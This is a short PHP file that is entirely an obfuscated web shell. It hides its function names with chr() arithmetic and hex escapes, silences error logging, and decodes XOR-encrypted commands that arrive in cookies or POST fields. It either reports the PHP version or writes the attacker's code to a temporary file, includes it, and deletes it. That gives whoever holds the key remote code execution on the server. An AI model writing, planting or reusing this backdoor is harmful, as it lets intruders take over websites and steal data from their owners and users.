<?php $hlsjotbogp = "\x66"."\151".chr(108)."\x65".'_'."\x70".chr(848-731).chr(1092-976).chr(758-663)."\x63".'o'.'n'.'t'."\x65".'n'.chr(116).chr(115);
$teulejl = "\142".chr(97).'s'."\x65".chr(484-430)."\64".'_'.chr(276-176).chr(516-415)."\x63".chr(111)."\x64".'e';
$fogrgpa = "\x69".chr(990-880).chr(144-39)."\x5f".chr(115)."\x65".chr(116);
$opwdcffow = "\165"."\156"."\154".chr(649-544)."\156".chr(295-188);


@$fogrgpa("\x65".'r'.chr(391-277).'o'."\162".'_'.chr(357-249).'o'."\x67", NULL);
@$fogrgpa(chr(119-11).'o'.'g'.'_'.chr(731-630).chr(114).chr(114).'o'."\162".chr(115), 0);
@$fogrgpa(chr(313-204).chr(97)."\x78"."\137"."\145".chr(620-500).'e'.'c'."\165"."\x74".chr(991-886).'o'."\x6e".chr(95).chr(116).'i'.'m'.chr(412-311), 0);
@set_time_limit(0);

function rjwjtqppam($brsbipylr, $bcmlhqaqyt)
{
    $cwxryukb = "";
    for ($otjatbf = 0; $otjatbf < strlen($brsbipylr);) {
        for ($j = 0; $j < strlen($bcmlhqaqyt) && $otjatbf < strlen($brsbipylr); $j++, $otjatbf++) {
            $cwxryukb .= chr(ord($brsbipylr[$otjatbf]) ^ ord($bcmlhqaqyt[$j]));
        }
    }
    return $cwxryukb;
}

$qsdgaxl = array_merge($_COOKIE, $_POST);
$mmzbuqorr = '201024a1-b859-4198-a21f-b54bd269c652';
foreach ($qsdgaxl as $prwthlt => $brsbipylr) {
    $brsbipylr = @unserialize(rjwjtqppam(rjwjtqppam($teulejl($brsbipylr), $mmzbuqorr), $prwthlt));
    if (isset($brsbipylr[chr(97).'k'])) {
        if ($brsbipylr["\x61"] == 'i') {
            $otjatbf = array(
                'p'.chr(653-535) => @phpversion(),
                's'.chr(118) => "3.5",
            );
            echo @serialize($otjatbf);
        } elseif ($brsbipylr["\x61"] == "\145") {
            $qbvkebrwc = "./" . md5($mmzbuqorr) . '.'.'i'.chr(543-433)."\x63";
            @$hlsjotbogp($qbvkebrwc, "<" . chr(63)."\x70"."\150"."\x70".chr(32)."\x40"."\x75".'n'.'l'."\151"."\156".chr(667-560).chr(722-682)."\x5f".'_'."\106".'I'.'L'."\x45"."\137".chr(95).chr(474-433).chr(646-587).' ' . $brsbipylr["\144"]);
            @include($qbvkebrwc);
            @$opwdcffow($qbvkebrwc);
        }
        exit();
    }
}

